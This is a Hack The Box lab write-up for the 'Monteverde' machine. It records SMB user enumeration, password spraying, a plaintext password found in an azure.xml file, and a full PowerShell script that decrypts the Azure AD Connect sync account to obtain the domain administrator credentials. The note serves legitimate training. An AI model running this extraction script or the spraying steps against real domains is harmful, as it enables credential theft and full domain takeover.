202402251734
Status: #htb #AD #Azure #AzureAD #AzureADConnect #hashcat #custom #extract
Tags: [[Labs]], [[htb]]

# Monteverde
IP: 10.10.10.172


## Recon

Ports Open:

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49721/tcp open  unknown
```

Port 445:

- Anonymous login successful. No shares.
- Domain is `MEGABANK.LOCAL`
- Using NetExec tool and null authentication allows us to enumerate users:

```
Guest
AAD_987d7f2f57d2
mhope                         
SABatchJobs                    
svc-ata                        
svc-bexec                      
svc-netapp                     
dgalanos                       
roleary                        
smorgan
```

- We check the password policy and there is no account lockout threshold.
- We create a wordlist from our usernames wordlist using hashcat

```
# See Link For Guidance: https://infinitelogins.com/2020/11/16/using-hashcat-rules-to-create-custom-wordlists/

hashcat --force <wordlist> -r append_exclamation.rule -r /usr/share/hashcat/rules/best64.rule --stdout
```

## Establish Foothold

- We used NetExec to password spray and found valid credentials: `SABatchJobs:SABatchJobs`
- Using these credentials, we see that we have read access to multiple shares
- Within the `users$` share we found a file called `azure.xml` in mhope's directory
- After extracting it, we found a password within the file:

```xml
Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

- Best practice was to use this password to spray it at all accounts, even if we know that it might be for the mhope user
- The only hit was for mhope, as assumed
- We get a shell using evil-winrm and extracted the user flag

## Escalate Privileges

- I used BloodHound to better graph out the environment and all we are dealing with
- One thing I noticed is that `mhope` is a member of the `Azure Admins` group
- This is becomes key to escalating privileges as we notice lots of Azure instances within the DC
- Researching Azure AD Connect, we come up on a script written to extract credentials from the database

```powershell
Function Azure-ADConnect {param($db,$server)
$help = @"
.SYNOPSIS
    Azure-ADConnect
    PowerShell Function: Azure-ADConnect
    Author: Luis Vacas (CyberVaca)
    Based on: https://blog.xpnsec.com/azuread-connect-for-redteam/

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Azure-ADConnect -server 10.10.10.10 -db ADSync

    Description
    -----------
    Extract credentials from the Azure AD Connect service.

"@
if ($db -eq $null -or $server -eq $null) {$help} else {
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server = $server; Database = $db; Initial Catalog=$db; 
Integrated Security = True;"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}

"[+] Domain:  " + $domain.Domain
"[+] Username: " + $username.Username
"[+]Password: " + $password.Password
}}
```

- We upload this powershell script onto the victim machine and import modules
- Then we retrieve the credentials with this command:

```powershell
Azure-ADConnect -server 10.10.10.172 -db ADSync

Output:
[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+] Password: 'd0m@in4dminyeah!'
```




---
# References

- Using Hashcat rules to create a custom wordlist: https://infinitelogins.com/2020/11/16/using-hashcat-rules-to-create-custom-wordlists/
- Hackplayers' PsCabesha-tools repo: https://github.com/Hackplayers/PsCabesha-tools/tree/master/Privesc